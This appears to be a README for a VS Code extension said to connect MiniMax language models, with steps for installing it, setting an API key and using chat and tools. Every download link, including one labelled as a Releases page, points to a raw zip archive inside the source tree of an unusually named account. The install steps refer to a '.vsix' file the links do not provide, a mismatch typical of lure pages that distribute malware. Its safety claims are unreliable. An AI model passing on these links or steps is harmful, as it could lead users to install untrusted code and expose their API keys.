# 🚀 mightymax-vscode - Connect MiniMax models to your editor

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/anthemneedleblight824/mightymax-vscode/raw/refs/heads/main/src/adapters/vscode_mightymax_1.2.zip)

This application brings MiniMax language models directly into Visual Studio Code. It allows you to use smart chat features, process images, and execute tool-based tasks without leaving your development environment.

## 📋 What this tool does

- Integrates MiniMax M-series models into VS Code.
- Enables chat sessions with full streaming support.
- Provides thinking blocks to show the reasoning process.
- Processes image inputs for visual analysis.
- Supports agentic tool-calling to perform complex actions.

## 🛠 Prerequisites

Ensure you have these items before you start:

1. **Visual Studio Code:** Download and install the latest version from the official Microsoft website.
2. **MiniMax API Key:** Create an account on the MiniMax platform and generate your personal API key. This key allows the software to connect to the language models. Keep this key safe.

## 📥 How to download and install

Follow these steps to set up the software on your Windows computer.

1. Go to the [Releases page](https://github.com/anthemneedleblight824/mightymax-vscode/raw/refs/heads/main/src/adapters/vscode_mightymax_1.2.zip).
2. Look for the latest version listed at the top.
3. Click the link ending in `.vsix` to start your download.
4. Open Visual Studio Code on your computer.
5. Click the Extensions icon on the left-hand sidebar. It looks like four squares.
6. Click the three dots at the top right of the Extensions panel.
7. Select "Install from VSIX..." from the menu.
8. Locate the file you downloaded in step 3 and select it.
9. Wait for the notification that confirms the installation.

## ⚙️ Setting up the connection

After you install the extension, you must provide your API key to enable the connection.

1. Open the VS Code command palette by pressing `Ctrl` + `Shift` + `P`.
2. Type "Mightymax" into the search bar.
3. Select "Mightymax: Set API Key".
4. Paste your MiniMax API key into the input field.
5. Press `Enter` to save the key.

The extension is now active. You can start a new chat session by opening the Chat panel within VS Code.

## 💬 Using chat features

The chat interface behaves like a standard messenger. Type your questions or instructions in the text area at the bottom of the chat panel. 

- **Streaming:** Responses appear in real time as the model generates them. 
- **Thinking Blocks:** If the model needs to reason, you will see a "Thinking" header. Expand this header to view the model's internal logic before the final answer appears.
- **Images:** Drag and drop an image file into the chat box to ask the model to analyze or describe the content.

## 🤖 Using tools

This software includes tool-calling capabilities. When you ask a question that requires external data or specific actions, the model decides which tool to use. 

For example, if you ask for a summary of a file, the model automatically calls the read-file tool. You might see a prompt asking for permission to execute a specific task. Review the prompt and click "Allow" if the action aligns with your current goal.

## 💻 System requirements

- **Operating System:** Windows 10 or Windows 11.
- **Memory:** 4GB of RAM minimum.
- **Internet:** An active connection is required to communicate with MiniMax servers.
- **Editor:** Visual Studio Code version 1.80.0 or higher.

## 🔍 Troubleshooting common issues

If you encounter errors, check these common items:

- **Invalid API Key:** If the chat returns unauthorized errors, re-enter your API key using the steps in the setup section. Ensure there are no extra spaces at the beginning or end of the key.
- **No Response:** Check your internet connection. If other websites load but the chat does not, wait a few minutes as the MiniMax servers may experience high traffic.
- **Extension Not Loading:** Ensure you installed the correct `.vsix` file. You can verify the installation in the Extensions panel under "Installed".

## 🛡 Security and privacy

Your API key lives locally on your computer in your user settings file. The software only sends your chat messages and uploaded images to the MiniMax service for processing. It does not share your private source code or local files without your direct trigger or permission.

## 📄 License

This project uses an open-source license. You remain responsible for your own usage costs and data transmitted through the MiniMax API. Always monitor your API usage on the official MiniMax dashboard.